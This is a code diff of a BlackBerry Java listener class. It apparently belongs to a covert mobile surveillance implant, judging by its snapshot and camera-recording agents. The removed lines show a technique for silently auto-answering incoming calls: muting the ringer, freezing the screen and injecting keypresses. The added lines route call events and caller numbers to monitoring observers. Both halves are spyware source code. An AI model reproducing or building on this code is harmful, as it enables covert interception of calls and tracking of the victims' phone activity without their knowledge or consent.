@@ -48,6 +48,9 @@ import blackberry.agent.SnapShotAgent;
 import blackberry.interfaces.ApplicationListObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
+import blackberry.interfaces.CallListObserver;
+import blackberry.interfaces.Observer;
+import blackberry.interfaces.PhoneCallObserver;
 import blackberry.interfaces.Singleton;
 import blackberry.record.CameraRecorder;
 import blackberry.utils.Check;
@@ -78,6 +81,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     Vector batteryStatusObservers = new Vector();
     Vector applicationListObservers = new Vector();
     Vector backlightObservers = new Vector();
+    Vector phoneCallObservers = new Vector();
+    Vector callListObservers = new Vector();
 
     Task task;
 
@@ -108,121 +113,99 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     }
 
     /**
-     * Adds the battery status observer.
+     * Adds the observer.
      * 
+     * @param observers
+     *            Vector of observers
      * @param observer
      *            the observer
      */
-    public synchronized void addBatteryStatusObserver(
-            final BatteryStatusObserver observer) {
+    public synchronized void addObserver(final Vector observers,
+            final Observer observer) {
 
         //#ifdef DBC
-        Check.requires(!batteryStatusObservers.contains(observer),
-                "already observing");
+        Check.requires(!observers.contains(observer), "already observing");
         //#endif
 
         //#ifdef DEBUG_TRACE
         debug.trace("adding observer: " + observer);
         //#endif
-        if (!batteryStatusObservers.contains(observer)) {
-            batteryStatusObservers.addElement(observer);
+        if (!observers.contains(observer)) {
+            observers.addElement(observer);
         }
     }
 
     /**
-     * Adds the application list observer.
+     * Removes observer.
      * 
+     * @param observers
+     *            Vector of observers
      * @param observer
      *            the observer
      */
+    public synchronized void removeObserver(final Vector observers,
+            final Observer observer) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("removing observer: " + observer);
+        //#endif
+
+        if (observers.contains(observer)) {
+            observers.removeElement(observer);
+        } else {
+            //#ifdef DEBUG
+            debug.error("removing observer not present: " + observer);
+            //#endif
+        }
+    }
+
+    public synchronized void addBatteryStatusObserver(
+            final BatteryStatusObserver observer) {
+        addObserver(batteryStatusObservers, observer);
+    }
+
+    public synchronized void removeBatteryStatusObserver(
+            final BatteryStatusObserver observer) {
+        removeObserver(batteryStatusObservers, observer);
+
+    }
+
     public synchronized void addApplicationListObserver(
             final ApplicationListObserver observer) {
+        addObserver(applicationListObservers, observer);
+    }
 
-        //#ifdef DBC
-        Check.requires(!applicationListObservers.contains(observer),
-                "already observing");
-        //#endif
-
-        //#ifdef DEBUG_TRACE
-        debug.trace("adding observer: " + observer);
-        //#endif
-        if (!applicationListObservers.contains(observer)) {
-            applicationListObservers.addElement(observer);
-        }
+    public synchronized void removeApplicationListObserver(
+            final ApplicationListObserver observer) {
+        removeObserver(applicationListObservers, observer);
     }
 
     public synchronized void addBacklightObserver(
             final BacklightObserver observer) {
-
-        //#ifdef DBC
-        Check.requires(!backlightObservers.contains(observer),
-                "already observing");
-        //#endif
-
-        //#ifdef DEBUG_TRACE
-        debug.trace("adding observer: " + observer);
-        //#endif
-        if (!backlightObservers.contains(observer)) {
-            backlightObservers.addElement(observer);
-        }
-    }
-
-    /**
-     * Removes the battery status observer.
-     * 
-     * @param observer
-     *            the observer
-     */
-    public synchronized void removeBatteryStatusObserver(
-            final BatteryStatusObserver observer) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("removing observer: " + observer);
-        //#endif
-
-        if (batteryStatusObservers.contains(observer)) {
-            batteryStatusObservers.removeElement(observer);
-        } else {
-            //#ifdef DEBUG
-            debug.error("removing observer not present: " + observer);
-            //#endif
-        }
-    }
-
-    /**
-     * Removes the application list observer.
-     * 
-     * @param observer
-     *            the observer
-     */
-    public synchronized void removeApplicationListObserver(
-            final ApplicationListObserver observer) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("removing observer: " + observer);
-        //#endif
-
-        if (applicationListObservers.contains(observer)) {
-            applicationListObservers.removeElement(observer);
-        } else {
-            //#ifdef DEBUG
-            debug.error("removing observer not present: " + observer);
-            //#endif
-        }
+        addObserver(backlightObservers, observer);
     }
 
     public synchronized void removeBacklightObserver(
             final BacklightObserver observer) {
+        removeObserver(backlightObservers, observer);
+    }
 
-        //#ifdef DEBUG_TRACE
-        debug.trace("removing observer: " + observer);
-        //#endif
+    public synchronized void addPhoneCallObserver(
+            final PhoneCallObserver observer) {
+        addObserver(phoneCallObservers, observer);
+    }
 
-        if (backlightObservers.contains(observer)) {
-            backlightObservers.removeElement(observer);
-        } else {
-            //#ifdef DEBUG
-            debug.error("removing observer not present: " + observer);
-            //#endif
-        }
+    public synchronized void removePhoneCallObserver(
+            final PhoneCallObserver observer) {
+        removeObserver(phoneCallObservers, observer);
+    }
+
+    public synchronized void addCallListObserver(final CallListObserver observer) {
+        addObserver(callListObservers, observer);
+    }
+
+    public synchronized void removeCallListObserver(
+            final CallListObserver observer) {
+        removeObserver(callListObservers, observer);
     }
 
     /*
@@ -591,9 +574,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
     }
 
-    boolean autoanswer = false;
-    int volume;
-
     public void callIncoming(int callId) {
         //#ifdef DEBUG_INFO
         debug.info("callIncoming: " + callId);
@@ -602,132 +582,99 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         PhoneCall phoneCall = Phone.getCall(callId);
         String phoneNumber = phoneCall.getDisplayPhoneNumber();
         boolean outgoing = phoneCall.isOutgoing();
-        //boolean outgoing =true;
-
-        volume = Alert.getVolume();
-        
-        Alert.setBuzzerVolume(0);
-        Audio.setVolume(0);
-
-        //PhoneArguments call = new PhoneArguments (PhoneArguments.ARG_CALL,phoneNumber);
-        //Invoke.invokeApplication(Invoke.APP_TYPE_PHONE, call);
 
         if (!outgoing) {
-            //#ifdef DEBUG_INFO
-            debug.info("answering");
-            //#endif
-            autoanswer = true;
-            //ScreenFake.Push();
-            synchronized (UiApplication.getEventLock()) {
-                UiApplication.getUiApplication().suspendPainting(true);
-            }
-
-            Locale prev = Locale.getDefault();
-            Locale locale = Locale.get(Locale.LOCALE_en);
-            locale.setDefault(locale);
-                        
-            //UiApplication.getUiApplication().getActiveScreen()
-            Menu menu = UiApplication.getUiApplication().getActiveScreen()
-                    .getMenu(0);
-            int size = menu.getSize();
+            final int size = phoneCallObservers.size();
             for (int i = 0; i < size; i++) {
-                MenuItem item = menu.getItem(i);
 
+                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
+                        .elementAt(i);
                 //#ifdef DEBUG_TRACE
-                debug.trace("menu " + i + " : " + item.toString());
+                debug.trace("notify: " + observer);
                 //#endif
 
-                //int s = MenuItem.SELECT;
-                //item.run();
+                observer.onCallIncoming(phoneNumber);
             }
-            
-            locale.setDefault(prev);           
-
-            Application.getApplication().invokeLater(new Runnable() {
-
-                public void run() {
-                    //Utils.sleep(100);
-                    // Keypad.KEY_SEND
-                    EventInjector.KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
-                            KeyCodeEvent.KEY_DOWN, (char) Keypad.KEY_SEND,
-                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
-                    EventInjector.KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
-                            KeyCodeEvent.KEY_UP, (char) Keypad.KEY_SEND,
-                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
-
-                    pressKey.post();
-                    releaseKey.post();
-                }
-            });
-            
-           
         }
+
     }
 
+
+    public void callConnected(int callId) {
+        //#ifdef DEBUG_INFO
+        debug.info("callConnected: " + callId);
+        //#endif
+
+        PhoneCall phoneCall = Phone.getCall(callId);
+        String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        boolean outgoing = phoneCall.isOutgoing();
+
+        if (!outgoing) {
+            final int size = phoneCallObservers.size();
+            for (int i = 0; i < size; i++) {
+
+                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
+                        .elementAt(i);
+                //#ifdef DEBUG_TRACE
+                debug.trace("notify: " + observer);
+                //#endif
+
+                observer.onCallConnected(phoneNumber);
+            }
+        }
+
+    }
+
+    public void callAnswered(int callId) {
+        //#ifdef DEBUG_INFO
+        debug.info("callAnswered: " + callId);
+        //#endif
+
+        PhoneCall phoneCall = Phone.getCall(callId);
+        String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        boolean outgoing = phoneCall.isOutgoing();
+
+        if (!outgoing) {
+            final int size = phoneCallObservers.size();
+            for (int i = 0; i < size; i++) {
+
+                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
+                        .elementAt(i);
+                //#ifdef DEBUG_TRACE
+                debug.trace("notify: " + observer);
+                //#endif
+
+                observer.onCallAnswered(phoneNumber);
+            }
+        }
+        
+    }
+    
     public void callDisconnected(int callId) {
         //#ifdef DEBUG_INFO
         debug.info("callDisconnected: " + callId);
         //#endif
 
-        autoanswer = false;       
-    }
-
-    public void callConnected(int callId) {
-        //#ifdef DEBUG_INFO
-        debug.info("callConnected: " + callId);
         PhoneCall phoneCall = Phone.getCall(callId);
-        debug.info("Phone call: " + phoneCall.getDisplayPhoneNumber());
-        //#endif      
-        synchronized (UiApplication.getEventLock()) {
-            UiApplication.getUiApplication().suspendPainting(false);
+        if(phoneCall == null){
+            return;
         }
+        
+        String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        boolean outgoing = phoneCall.isOutgoing();
 
-        Backlight.enable(false);
-    }
+        if (!outgoing) {
+            final int size = phoneCallObservers.size();
+            for (int i = 0; i < size; i++) {
 
-    public void callAnswered(int arg0) {
-        //#ifdef DEBUG_INFO
-        debug.info("callAnswererd: " + arg0);
-        //#endif
+                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
+                        .elementAt(i);
+                //#ifdef DEBUG_TRACE
+                debug.trace("notify: " + observer);
+                //#endif
 
-        if (autoanswer) {
-            Application.getApplication().invokeLater(new Runnable() {
-
-                public void run() {
-                    //ScreenFake.Push();
-                    //Utils.sleep(100);
-                    synchronized (UiApplication.getEventLock()) {
-                        UiApplication.getUiApplication().suspendPainting(true);
-                    }
-
-                    KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
-                            EventInjector.KeyCodeEvent.KEY_DOWN,
-                            (char) Keypad.KEY_MENU,
-                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
-                    KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
-                            EventInjector.KeyCodeEvent.KEY_UP,
-                            (char) Keypad.KEY_MENU,
-                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
-
-                    pressKey.post();
-                    releaseKey.post();
-
-                    EventInjector.TrackwheelEvent e = new EventInjector.TrackwheelEvent(
-                            EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, 9,
-                            KeypadListener.STATUS_TRACKWHEEL);
-                    EventInjector.invokeEvent(e);
-
-                    e = new EventInjector.TrackwheelEvent(
-                            EventInjector.TrackwheelEvent.THUMB_CLICK, 1,
-                            KeypadListener.STATUS_TRACKWHEEL);
-                    EventInjector.invokeEvent(e);
-
-                }
-
-            });
-            
-            Alert.setBuzzerVolume(100);
-            Alert.setVolume(volume);
+                observer.onCallDisconnected(phoneNumber);
+            }
         }
     }
 
